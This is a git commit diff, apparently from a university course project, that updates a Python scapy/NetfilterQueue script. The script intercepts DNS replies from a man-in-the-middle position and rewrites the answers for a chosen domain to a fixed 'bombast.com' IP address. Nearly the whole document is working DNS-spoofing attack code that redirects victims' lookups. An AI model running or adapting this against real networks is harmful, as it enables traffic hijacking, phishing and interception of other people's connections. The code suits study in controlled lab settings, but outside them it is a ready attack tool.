9d836301008088cd9d35f5128840acc183a031a3
wblucca <wblucca@wpi.edu>
2019-11-20 17:27:20 -0500

    Fix mitm, use correct iptable rule please!

--- mitmPacketChanger.py
+++ mitmPacketChanger.py
@@ -5,8 +5,15 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
+
+
+# TODO with Wai, try source/dest addresses instead of just port when creating iptables rule
+
+
+
+
 BOMBAST_ADDR = '10.4.18.2'  # bombast.com
-ISP_DOMAINS = ['atb.com']  # ISPs to change if in reply
+ISP_DOMAINS = ['atb.com.bombast.com.']  # ISPs to change if in reply
 
 def modify(packet):
     # Convert the raw packet to a scapy compatible string
@@ -16,13 +23,14 @@ def modify(packet):
     if scapy_pkt.haslayer(DNSRR):
         # If the packet is a DNS Resource Record (DNS reply)
         # Modify the packet
-        print("[Before]:", scapy_pkt.summary())
+        print("[Before]:", scapy_pkt[DNS].an, scapy_pkt[IP].src, scapy_pkt[IP].dst)
         try:
             scapy_pkt = changeToBombast(scapy_pkt)
         except IndexError:
             # Not UDP packet, this can be IPerror/UDPerror packets
             pass
-        print("[After]: ", scapy_pkt.summary())
+
+        print("[After]: ", scapy_pkt[DNS].an, scapy_pkt[IP].src, scapy_pkt[IP].dst)
 
         # Set the packet content to our modified version
         packet.set_payload(bytes(scapy_pkt))
@@ -34,35 +42,41 @@ def modify(packet):
 # to bombast addr if one is found
 def changeToBombast(scapy_pkt):
     # Get the DNS question name, the domain name
-    qname = packet[DNSQR].qname
+    qname = scapy_pkt[DNSQR].qname
     if qname not in ISP_DOMAINS:
-        # Don't modify if the question is an ISP domain
-        print("no modification:", qname)
-        return packet
+        # Don't modify if the question is a non-ISP domain
+        print('No modification:', qname)
+
+        # New calculations are required (scapy will do automatically)
+        del scapy_pkt[IP].len
+        del scapy_pkt[IP].chksum
+        del scapy_pkt[UDP].len
+        del scapy_pkt[UDP].chksum
+
+        return scapy_pkt
 
     # Craft new answer, overriding the original
-    # Setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
-    packet[DNS].an = DNSRR(rrname=qname, rdata=BOMBAST_ADDR)
+    # Setting the rdata for the IP we want to redirect (bombast.com)
+    scapy_pkt[DNS].an = DNSRR(rrname=qname, type=1, rclass=1, ttl=604800, rdata=BOMBAST_ADDR)
     # Set the answer count to 1
-    packet[DNS].ancount = 1
+    scapy_pkt[DNS].ancount = 1
 
     # Delete checksums and length of packet, because we have modified the packet
     # New calculations are required (scapy will do automatically)
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
+    del scapy_pkt[IP].len
+    del scapy_pkt[IP].chksum
+    del scapy_pkt[UDP].len
+    del scapy_pkt[UDP].chksum
 
     # Return the modified packet
-    return packet
+    return scapy_pkt
 
 nfqueue = NetfilterQueue()  
 
 # 1 is the iptables rule queue number, modify is the callback function
 nfqueue.bind(1, modify) 
 try:
-    print "[*] waiting for data"
+    print "Waiting for packets...\n"
     nfqueue.run()
 except KeyboardInterrupt:
     pass
